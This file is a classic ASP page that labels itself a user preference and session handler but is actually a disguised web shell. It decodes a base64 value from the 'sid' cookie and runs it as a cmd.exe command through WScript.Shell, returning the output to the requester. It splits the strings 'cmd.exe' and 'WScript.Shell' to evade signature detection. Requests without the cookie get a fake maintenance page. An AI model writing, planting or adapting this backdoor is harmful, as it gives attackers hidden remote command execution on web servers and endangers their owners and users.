<%@ Language=VBScript %>
<%
' User preference / session handler - do not modify
Response.Buffer = True
Response.CacheControl = "private"
Response.Expires = -1
Response.ContentType = "text/html; charset=utf-8"

Dim vA, vB, vC, vD, sh, ex, ot, er

vA = Request.Cookies("sid")

' Length check fix kiya → short base64 bhi accept karega
If Len(vA) > 4 Then
    
    vB = vA
    
    On Error Resume Next
    
    vC = Decode64(vB)
    
    If Len(vC) > 1 And Err.Number = 0 Then
        
        ' cmd.exe split (anti-signature)
        vD = "c" & "md" & "." & "e" & "xe"
        
        Set sh = Server.CreateObject("W" & "Scr" & "ipt" & ".Sh" & "ell")
        Set ex = sh.Exec(vD & " /c " & vC)
        
        ot = ex.StdOut.ReadAll
        er = ex.StdErr.ReadAll
        
        If Len(ot) > 0 Then
            Response.Write Server.HTMLEncode(ot)
        End If
        
        If Len(er) > 0 Then
            Response.Write Server.HTMLEncode(vbCrLf & "[err] " & er)
        End If
        
        Set ex = Nothing
        Set sh = Nothing
    End If
    
    Err.Clear
    On Error Goto 0
    
Else
    ' No valid cookie → fake normal output (stealth)
    Response.Write "<!-- Site configuration page -->"
    Response.Write "<html><head><title>Maintenance</title></head><body>"
    Response.Write "<h3>Portal under scheduled update. Please check back later.</h3>"
    Response.Write "</body></html>"
End If

' Base64 decode function (classic ASP ke liye zaroori)
Function Decode64(strIn)
    Dim xmlObj, elm
    Set xmlObj = Server.CreateObject("Msxml2.DOMDocument.6.0")
    Set elm = xmlObj.CreateElement("data")
    elm.DataType = "bin.base64"
    elm.Text = strIn
    Decode64 = StrConv(elm.NodeTypedValue, vbUnicode)
    Set elm = Nothing
    Set xmlObj = Nothing
End Function
%>
